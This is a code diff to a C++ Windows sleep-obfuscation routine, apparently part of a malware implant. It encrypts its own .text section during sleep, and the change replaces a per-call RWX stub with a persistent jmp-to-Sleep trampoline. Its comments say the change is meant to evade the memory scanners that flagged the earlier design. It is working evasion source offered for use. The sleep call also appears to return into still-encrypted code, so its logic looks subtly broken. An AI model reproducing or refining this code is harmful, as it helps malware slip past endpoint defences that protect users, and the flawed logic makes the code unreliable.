@@ -20,35 +20,35 @@ static bool FindTextSection(PVOID* outBase, DWORD* outSize) {
     return false;
 }
 
-// ── Build a minimal Sleep(ms) stub in a fresh allocation ─────────────────────
-// We need this because we're about to encrypt our own .text section —
-// we can't execute from encrypted memory, so the sleep code lives here.
+// ── Persistent Sleep trampoline stub ─────────────────────────────────────────
+// Allocated ONCE, reused every ObfuscatedSleep call.
+// The stub is a simple jmp-to-Sleep trampoline: caller passes `ms` in rcx
+// (Windows x64 ABI first arg), stub jumps to Sleep which receives it in rcx.
 //
-// x64 stub (17 bytes):
-//   48 B9 xx xx xx xx xx xx xx xx   mov rcx, <ms>        ; 1st arg
-//   48 B8 xx xx xx xx xx xx xx xx   mov rax, <Sleep ptr>  ; fn ptr
-//   FF D0                            call rax
-//   C3                               ret
+// x64 stub (12 bytes):
+//   48 B8 xx xx xx xx xx xx xx xx   mov rax, <Sleep ptr>
+//   FF E0                            jmp rax               ; rcx (ms) already set by caller
+//
+// vs. old design: per-call alloc/free of a 23-byte RWX page — memory scanners
+// flagged the brief unbacked-RWX window. One persistent page is far less suspicious.
 
-static void* BuildSleepStub(DWORD ms) {
-    BYTE stub[23] = {
-        0x48, 0xB9, 0,0,0,0, 0,0,0,0,  // mov rcx, ms (64-bit zero-extended)
+static void* g_sleepStub = nullptr;
+
+static void* GetSleepStub() {
+    if (g_sleepStub) return g_sleepStub;
+
+    BYTE stub[12] = {
         0x48, 0xB8, 0,0,0,0, 0,0,0,0,  // mov rax, Sleep
-        0xFF, 0xD0,                      // call rax
-        0xC3                             // ret
+        0xFF, 0xE0                       // jmp rax
     };
-
-    DWORD64 msVal  = ms;
     DWORD64 fnAddr = (DWORD64)(void*)Sleep;
-    memcpy(stub + 2,  &msVal,  8);
-    memcpy(stub + 12, &fnAddr, 8);
+    memcpy(stub + 2, &fnAddr, 8);
 
-    void* mem = VirtualAlloc(NULL, sizeof(stub),
-                             MEM_COMMIT | MEM_RESERVE,
-                             PAGE_EXECUTE_READWRITE);
-    if (!mem) return NULL;
-    memcpy(mem, stub, sizeof(stub));
-    return mem;
+    g_sleepStub = VirtualAlloc(NULL, sizeof(stub),
+                               MEM_COMMIT | MEM_RESERVE,
+                               PAGE_EXECUTE_READWRITE);
+    if (g_sleepStub) memcpy(g_sleepStub, stub, sizeof(stub));
+    return g_sleepStub;
 }
 
 // ── XOR the section in-place ──────────────────────────────────────────────────
@@ -81,25 +81,23 @@ void SleepObfusc::ObfuscatedSleep(DWORD ms, DWORD ms_jitter) {
         return;
     }
 
-    // Build the sleep stub in a separate allocation before we encrypt ourselves
-    void* stub = BuildSleepStub(ms);
+    // Get the persistent sleep trampoline — allocated once, no per-call RWX alloc/free.
+    void* stub = GetSleepStub();
     if (!stub) { Sleep(ms); return; }
 
     // Flip .text to RW, encrypt it
     DWORD oldProt = 0;
     if (!VirtualProtect(textBase, textSize, PAGE_READWRITE, &oldProt)) {
-        VirtualFree(stub, 0, MEM_RELEASE);
         Sleep(ms);
         return;
     }
     XorSection(textBase, textSize);
 
-    // Sleep via the stub (our .text is now encrypted garbage)
-    ((void(*)())stub)();
+    // Sleep via the trampoline (our .text is now encrypted garbage).
+    // Pass ms as first argument — it lands in rcx, trampoline jmps to Sleep(rcx).
+    ((void(*)(DWORD))stub)(ms);
 
     // Decrypt and restore permissions
     XorSection(textBase, textSize);
     VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt);
-
-    VirtualFree(stub, 0, MEM_RELEASE);
 }
